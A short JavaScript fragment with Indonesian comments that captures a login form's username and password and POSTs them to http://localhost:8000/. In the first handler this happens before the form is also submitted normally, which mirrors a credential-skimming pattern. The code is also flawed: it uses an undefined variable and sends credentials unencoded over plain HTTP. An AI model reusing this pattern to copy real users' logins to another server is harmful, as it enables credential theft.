const black = document.getElementById('black');

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Mengirim data ke URL lain menggunakan fetch
            fetch('http://localhost:8000/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `username=${username}&password=${password}`
            })
            .then(response => response.text())
            .then(data => {
                // Menampilkan respon dari server
                console.log(data);
            })
            .catch(error => {
                console.error('Error:', error);
            });

            // Mengirim form langsung ke process-login.php
            loginForm.submit();
        });
document.getElementById('black').addEventListener('submit', function(event) {

            event.preventDefault(); // Mencegah form melakukan pengiriman langsung

            // Mengambil nilai input dari form

            var username = document.getElementById('username').value;

            var password = document.getElementById('password').value;

            // Data form yang akan dikirim

            var data = {

                username: username,

                password: password

            };

            // Mengirim data form menggunakan fetch

            fetch('http://localhost:8000/', {

                method: 'POST',

                body: JSON.stringify(data),

                headers: {

                    'Content-Type': 'application/json'

                }

            })

            .then(function(response) {

                if (response.ok) {

                    return response.text();

                }

                throw new Error('Terjadi kesalahan dalam pengiriman data form.');

            })

            .then(function(responseText) {

                console.log(responseText); // Output pesan respons dari proses.php

            })

            .catch(function(error) {

                console.error(error);

            });

        });
